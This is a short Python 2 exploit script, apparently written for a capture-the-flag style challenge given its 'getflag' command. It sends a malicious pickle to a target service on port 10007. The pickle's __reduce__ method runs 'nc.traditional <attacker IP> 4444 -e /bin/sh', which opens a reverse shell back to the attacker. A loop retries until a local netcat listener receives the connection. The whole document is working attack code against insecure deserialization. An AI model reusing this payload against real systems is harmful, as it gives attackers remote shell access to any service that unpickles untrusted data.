#!/usr/bin/python

# This exploit only works with python2, python3 has some issue with encoding.
from pwn import *
from sys import argv,exit
import pickle

if len(argv) < 3:
	exit("{} Target_IP Local_IP".format(argv[0])) 

class Reverseshell(object):
	def __reduce__(self):
		return (os.system, ("nc.traditional {} 4444 -e /bin/sh".format(argv[2]),))

payload = pickle.dumps(Reverseshell())

while True:
	# Don't know the exact reason but we are recving the connection back after every 2-3 tries that why i have used a loop that run until we get a connection on netcat.
	local_pro = process(['nc','-nvlp','4444'])
	local_pro.recvline()
	remote_pro = remote(argv[1],10007)
	remote_pro.sendline(payload)
	connection_check = local_pro.recvline(timeout=1)
	if connection_check == "":
		local_pro.kill()
		remote_pro.close()
		continue
	else:
		local_pro.sendline('getflag')
		local_pro.interactive()
		break
